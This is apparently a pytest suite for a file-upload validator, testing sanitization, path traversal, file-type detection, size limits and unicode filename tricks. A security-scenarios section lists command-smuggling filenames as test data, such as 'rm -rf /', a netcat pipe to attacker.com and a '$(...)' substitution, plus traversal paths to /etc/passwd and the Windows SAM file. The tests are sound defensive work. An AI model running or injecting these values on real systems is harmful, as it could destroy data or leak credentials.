#!/usr/bin/env python3
"""
Tests for file upload validation.

These tests verify secure file handling for PDFs, audio files, and other uploads.
"""

import base64
import hashlib
import os
import tempfile
from pathlib import Path
from unittest.mock import Mock, patch
import pytest

# Import file validation components
from backend.file_validation import (
    FileValidator,
    FileValidationError,
    validate_base64_audio,
    validate_pdf_path,
    get_file_size_limits
)


class TestFileValidator:
    """Test the core FileValidator class"""

    def setup_method(self):
        """Set up test fixtures"""
        self.validator = FileValidator()

    def test_sanitize_filename_basic(self):
        """Test basic filename sanitization"""
        result = self.validator.sanitize_filename("test_file.pdf")
        assert result == "test_file.pdf"

    def test_sanitize_filename_dangerous_chars(self):
        """Test sanitization removes dangerous characters"""
        dangerous = "test<>:\"|?*file.pdf"
        result = self.validator.sanitize_filename(dangerous)
        assert result == "testfile.pdf"

    def test_sanitize_filename_path_traversal(self):
        """Test sanitization removes path traversal attempts"""
        malicious = "../../etc/passwd"
        result = self.validator.sanitize_filename(malicious)
        assert result == "passwd"
        assert ".." not in result

    def test_sanitize_filename_empty(self):
        """Test empty filename raises error"""
        with pytest.raises(FileValidationError, match="Filename cannot be empty"):
            self.validator.sanitize_filename("")

    def test_sanitize_filename_too_long(self):
        """Test overly long filename is truncated"""
        long_name = "a" * 300 + ".pdf"
        result = self.validator.sanitize_filename(long_name)
        assert len(result) <= 255
        assert result.endswith(".pdf")

    def test_validate_path_basic(self):
        """Test basic path validation"""
        test_path = "documents/test.pdf"
        result = self.validator.validate_path(test_path)
        assert "test.pdf" in result

    def test_validate_path_traversal_detection(self):
        """Test path traversal detection"""
        with pytest.raises(FileValidationError, match="Path traversal detected"):
            self.validator.validate_path("../../../etc/passwd")

    def test_validate_path_empty(self):
        """Test empty path raises error"""
        with pytest.raises(FileValidationError, match="File path cannot be empty"):
            self.validator.validate_path("")

    def test_detect_pdf_file_type(self):
        """Test PDF file type detection via magic bytes"""
        pdf_content = b'%PDF-1.4\n1 0 obj\n<<\n/Type /Catalog'
        file_type, mime_type = self.validator.detect_file_type(pdf_content, "test.pdf")
        assert file_type == "pdf"
        assert mime_type == "application/pdf"

    def test_detect_audio_file_type_wav(self):
        """Test WAV audio file type detection"""
        wav_content = b'RIFF\x24\x08\x00\x00WAVE'
        file_type, mime_type = self.validator.detect_file_type(wav_content, "test.wav")
        assert file_type == "audio"
        assert mime_type in ["audio/wav", "audio/wave", "audio/x-wav"]

    def test_detect_audio_file_type_mp3(self):
        """Test MP3 audio file type detection"""
        mp3_content = b'ID3\x03\x00\x00\x00'
        file_type, mime_type = self.validator.detect_file_type(mp3_content, "test.mp3")
        assert file_type == "audio"

    def test_detect_unsupported_file_type(self):
        """Test unsupported file type raises error"""
        exe_content = b'MZ\x90\x00'  # Windows executable header
        with pytest.raises(FileValidationError, match="Unsupported file type"):
            self.validator.detect_file_type(exe_content, "malware.exe")

    def test_validate_file_size_pdf_ok(self):
        """Test valid PDF file size"""
        content = b'%PDF-1.4\n' + b'x' * (10 * 1024 * 1024)  # 10MB
        self.validator.validate_file_size(content, "pdf")  # Should not raise

    def test_validate_file_size_pdf_too_large(self):
        """Test oversized PDF raises error"""
        content = b'%PDF-1.4\n' + b'x' * (60 * 1024 * 1024)  # 60MB (over 50MB limit)
        with pytest.raises(FileValidationError, match="File too large"):
            self.validator.validate_file_size(content, "pdf")

    def test_validate_file_size_audio_ok(self):
        """Test valid audio file size"""
        content = b'RIFF' + b'x' * (20 * 1024 * 1024)  # 20MB
        self.validator.validate_file_size(content, "audio")  # Should not raise

    def test_validate_file_size_audio_too_large(self):
        """Test oversized audio raises error"""
        content = b'RIFF' + b'x' * (30 * 1024 * 1024)  # 30MB (over 25MB limit)
        with pytest.raises(FileValidationError, match="File too large"):
            self.validator.validate_file_size(content, "audio")

    def test_check_dangerous_extension(self):
        """Test dangerous file extension detection"""
        with pytest.raises(FileValidationError, match="Dangerous file extension"):
            self.validator.check_dangerous_content(b'test', "malware.exe")

    def test_check_dangerous_pdf_content(self):
        """Test dangerous PDF content detection"""
        dangerous_pdf = b'%PDF-1.4\n1 0 obj\n<</JavaScript (alert("XSS"))>>'
        with pytest.raises(FileValidationError, match="PDF contains potentially dangerous content"):
            self.validator.check_dangerous_content(dangerous_pdf, "malicious.pdf")

    def test_check_null_bytes(self):
        """Test null byte injection detection"""
        content_with_nulls = b'test\x00content'
        with pytest.raises(FileValidationError, match="File contains null bytes"):
            self.validator.check_dangerous_content(content_with_nulls, "test.txt")

    def test_validate_file_complete_success(self):
        """Test complete file validation success"""
        pdf_content = b'%PDF-1.4\n1 0 obj\n<<\n/Type /Catalog\n>>\nendobj\n%%EOF'
        result = self.validator.validate_file(pdf_content, "test_document.pdf")
        
        assert result['valid'] is True
        assert result['file_type'] == 'pdf'
        assert result['mime_type'] == 'application/pdf'
        assert result['sanitized_filename'] == 'test_document.pdf'
        assert result['size_bytes'] == len(pdf_content)
        assert 'hash_sha256' in result
        assert len(result['hash_sha256']) == 64  # SHA256 hex length

    def test_validate_file_with_warnings(self):
        """Test file validation with warnings"""
        old_pdf_content = b'%PDF-1.3\n1 0 obj\n<<\n/Type /Catalog\n>>\nendobj\n%%EOF'
        result = self.validator.validate_file(old_pdf_content, "old_document.pdf")
        
        assert result['valid'] is True
        assert len(result['warnings']) > 0
        assert any("Old PDF version" in warning for warning in result['warnings'])

    def test_validate_file_complete_failure(self):
        """Test complete file validation failure"""
        malicious_content = b'MZ\x90\x00'  # Windows executable
        with pytest.raises(FileValidationError):
            self.validator.validate_file(malicious_content, "malware.exe")

    def test_restricted_file_types(self):
        """Test validator with restricted file types"""
        audio_only_validator = FileValidator(allowed_types=['audio'])
        pdf_content = b'%PDF-1.4\n'
        
        with pytest.raises(FileValidationError, match="File type 'pdf' not allowed"):
            audio_only_validator.validate_file(pdf_content, "test.pdf")


class TestHelperFunctions:
    """Test helper functions"""

    def test_validate_base64_audio_success(self):
        """Test successful base64 audio validation"""
        # Create valid WAV audio data
        wav_data = b'RIFF\x24\x08\x00\x00WAVE' + b'x' * 1000
        b64_data = base64.b64encode(wav_data).decode('utf-8')
        
        result = validate_base64_audio(b64_data)
        assert result['valid'] is True
        assert result['file_type'] == 'audio'

    def test_validate_base64_audio_invalid_b64(self):
        """Test invalid base64 data"""
        with pytest.raises(FileValidationError, match="Invalid base64 audio data"):
            validate_base64_audio("invalid_base64_data!!!")

    def test_validate_base64_audio_too_large(self):
        """Test oversized base64 audio"""
        large_data = b'RIFF' + b'x' * (30 * 1024 * 1024)  # 30MB
        b64_data = base64.b64encode(large_data).decode('utf-8')
        
        with pytest.raises(FileValidationError, match="File too large"):
            validate_base64_audio(b64_data)

    def test_validate_base64_audio_custom_size_limit(self):
        """Test custom size limit for base64 audio"""
        # 5MB data
        data = b'RIFF' + b'x' * (5 * 1024 * 1024)
        b64_data = base64.b64encode(data).decode('utf-8')
        
        # Should pass with 10MB limit
        result = validate_base64_audio(b64_data, max_size_mb=10)
        assert result['valid'] is True
        
        # Should fail with 1MB limit
        with pytest.raises(FileValidationError, match="File too large"):
            validate_base64_audio(b64_data, max_size_mb=1)

    def test_validate_pdf_path_success(self):
        """Test successful PDF path validation"""
        pdf_content = b'%PDF-1.4\n1 0 obj\n<<\n/Type /Catalog\n>>\nendobj\n%%EOF'
        
        # Create temp file with delete=False, then manually clean up
        tmp_file = tempfile.NamedTemporaryFile(suffix='.pdf', delete=False)
        try:
            tmp_file.write(pdf_content)
            tmp_file.close()  # Close the file so it can be read on Windows
            
            result = validate_pdf_path(tmp_file.name)
            assert result['valid'] is True
            assert result['file_type'] == 'pdf'
        finally:
            # Clean up
            try:
                os.unlink(tmp_file.name)
            except OSError:
                pass  # File may not exist or be locked

    def test_validate_pdf_path_file_not_found(self):
        """Test PDF path validation with non-existent file"""
        with pytest.raises(FileValidationError, match="Cannot read file"):
            validate_pdf_path("/nonexistent/path/test.pdf")

    def test_get_file_size_limits_defaults(self):
        """Test default file size limits"""
        limits = get_file_size_limits()
        assert limits['pdf_max_mb'] == 50
        assert limits['audio_max_mb'] == 25
        assert limits['text_max_mb'] == 10
        assert limits['archive_max_mb'] == 100

    @patch.dict(os.environ, {
        'PDF_MAX_SIZE_MB': '100',
        'AUDIO_MAX_SIZE_MB': '50',
        'TEXT_MAX_SIZE_MB': '20',
        'ARCHIVE_MAX_SIZE_MB': '200'
    })
    def test_get_file_size_limits_from_env(self):
        """Test file size limits from environment variables"""
        limits = get_file_size_limits()
        assert limits['pdf_max_mb'] == 100
        assert limits['audio_max_mb'] == 50
        assert limits['text_max_mb'] == 20
        assert limits['archive_max_mb'] == 200


class TestSecurityScenarios:
    """Test various security attack scenarios"""

    def setup_method(self):
        """Set up test fixtures"""
        self.validator = FileValidator()

    def test_zip_bomb_detection(self):
        """Test zip bomb size detection"""
        # Simulate large compressed content
        large_zip_content = b'PK\x03\x04' + b'x' * (150 * 1024 * 1024)  # 150MB
        with pytest.raises(FileValidationError, match="File too large"):
            self.validator.validate_file(large_zip_content, "bomb.zip")

    def test_path_traversal_variations(self):
        """Test various path traversal attack patterns"""
        traversal_patterns = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f",  # URL encoded ../../../
            "....//....//....//",
            "....\\\\....\\\\....\\\\",
        ]
        
        for pattern in traversal_patterns:
            with pytest.raises(FileValidationError, match="Path traversal detected"):
                self.validator.validate_path(pattern)

    def test_filename_injection_attacks(self):
        """Test filename-based injection attacks"""
        malicious_filenames = [
            "test.pdf.exe",  # Double extension
            "test.pdf\x00.exe",  # Null byte injection
            "CON.pdf",  # Windows device name
            "test.pdf;rm -rf /",  # Command injection
            "test.pdf|nc attacker.com 4444",  # Pipe injection
            "$(rm -rf /).pdf",  # Command substitution
        ]
        
        pdf_content = b'%PDF-1.4\n'
        for filename in malicious_filenames:
            try:
                # Some should be caught by sanitization, others by dangerous content checks
                result = self.validator.validate_file(pdf_content, filename)
                # If it passes validation, check that filename is sanitized
                sanitized = result['sanitized_filename']
                
                # CON.pdf should become file_CON.pdf
                if filename == "CON.pdf":
                    assert sanitized == "file_CON.pdf"
                else:
                    assert sanitized != filename
                    assert not any(char in sanitized for char in ['|', ';', '$', '\x00'])
            except FileValidationError:
                # This is also acceptable - the attack was detected
                pass

    def test_polyglot_file_detection(self):
        """Test detection of polyglot files (valid as multiple formats)"""
        # Create content that could be interpreted as both PDF and script
        polyglot_content = b'%PDF-1.4\n#/bin/bash\necho "malicious script"\n'
        
        # Should be detected as PDF due to magic bytes taking precedence
        file_type, _ = self.validator.detect_file_type(polyglot_content, "polyglot.pdf")
        assert file_type == "pdf"

    def test_embedded_executable_detection(self):
        """Test detection of executables embedded in allowed file types"""
        # PDF with embedded JavaScript
        malicious_pdf = b'%PDF-1.4\n1 0 obj\n<</JavaScript (app.alert("XSS"))>>\nendobj'
        with pytest.raises(FileValidationError, match="PDF contains potentially dangerous content"):
            self.validator.validate_file(malicious_pdf, "malicious.pdf")

    def test_unicode_filename_attacks(self):
        """Test unicode-based filename attacks"""
        unicode_attacks = [
            "test\u202e.pdf.exe",  # Right-to-left override
            "test\u200b.pdf",  # Zero-width space
            "test\ufeff.pdf",  # Byte order mark
            "тест.pdf",  # Cyrillic characters
        ]
        
        pdf_content = b'%PDF-1.4\n'
        for filename in unicode_attacks:
            try:
                result = self.validator.validate_file(pdf_content, filename)
                # Check that dangerous unicode characters are removed
                sanitized = result['sanitized_filename']
                assert '\u202e' not in sanitized
                assert '\u200b' not in sanitized
                assert '\ufeff' not in sanitized
            except FileValidationError:
                # Detection and rejection is also acceptable
                pass


class TestMagicLibraryFallbacks:
    """Test behavior when python-magic library is not available"""

    @patch('backend.file_validation.MAGIC_AVAILABLE', False)
    def test_fallback_without_magic(self):
        """Test file validation falls back gracefully without python-magic"""
        validator = FileValidator()
        assert not validator.magic_available
        
        # Should still work with magic bytes and extension detection
        pdf_content = b'%PDF-1.4\n'
        result = validator.validate_file(pdf_content, "test.pdf")
        assert result['valid'] is True
        assert result['file_type'] == 'pdf'

    def test_magic_library_exception_handling(self):
        """Test handling of python-magic exceptions"""
        # Create a validator instance and manually set up magic failure
        validator = FileValidator()
        
        # Create a mock that raises exception during detection
        mock_instance = Mock()
        mock_instance.from_buffer.side_effect = Exception("Magic detection failed")
        
        # Override the validator's magic instance
        validator.magic_available = True
        validator.magic_mime = mock_instance
        
        # Should fall back to other detection methods
        pdf_content = b'%PDF-1.4\n'
        file_type, _ = validator.detect_file_type(pdf_content, "test.pdf")
        assert file_type == "pdf"


class TestPerformanceAndLimits:
    """Test performance and resource limit scenarios"""

    def test_large_file_memory_efficiency(self):
        """Test that large file validation doesn't consume excessive memory"""
        # Create a moderately large file (just under limit)
        pdf_content = b'%PDF-1.4\n' + b'x' * (45 * 1024 * 1024)  # 45MB
        
        validator = FileValidator()
        result = validator.validate_file(pdf_content, "large.pdf")
        
        assert result['valid'] is True
        assert result['size_mb'] < 50  # Within PDF limit

    def test_hash_calculation_accuracy(self):
        """Test SHA256 hash calculation accuracy"""
        content = b'%PDF-1.4\ntest content'
        expected_hash = hashlib.sha256(content).hexdigest()
        
        validator = FileValidator()
        result = validator.validate_file(content, "test.pdf")
        
        assert result['hash_sha256'] == expected_hash

    def test_concurrent_validation_safety(self):
        """Test that multiple concurrent validations don't interfere"""
        import threading
        
        results = []
        errors = []
        
        def validate_file(file_num):
            try:
                content = b'%PDF-1.4\n' + f'content {file_num}'.encode()
                validator = FileValidator()
                result = validator.validate_file(content, f"test{file_num}.pdf")
                results.append(result)
            except Exception as e:
                errors.append(e)
        
        # Run multiple validations concurrently
        threads = []
        for i in range(10):
            thread = threading.Thread(target=validate_file, args=(i,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # All validations should succeed
        assert len(errors) == 0
        assert len(results) == 10
        assert all(result['valid'] for result in results)
        
        # Each should have unique content hash
        hashes = [result['hash_sha256'] for result in results]
        assert len(set(hashes)) == 10  # All unique


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
